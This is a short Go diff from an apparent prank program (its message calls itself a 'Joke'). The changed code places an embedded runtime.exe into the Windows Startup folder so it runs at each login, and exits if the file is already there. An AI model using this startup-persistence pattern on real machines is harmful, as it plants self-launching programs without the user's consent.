@@ -18,9 +18,7 @@ func download() {
 		if fileExists("/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtime.exe") {
 			os.Exit(69)
 		} else {
-			file := string(_runnerExe)
-			exe, _ := ioutil.ReadFile(file)
-			ioutil.WriteFile("/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtime.exe", exe, 777)
+			RestoreAsset("/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/", "runtime.exe")
 		}
 	} else {
 		dlgs.Warning("ERROR", "This Joke is not compatible with linux yet")
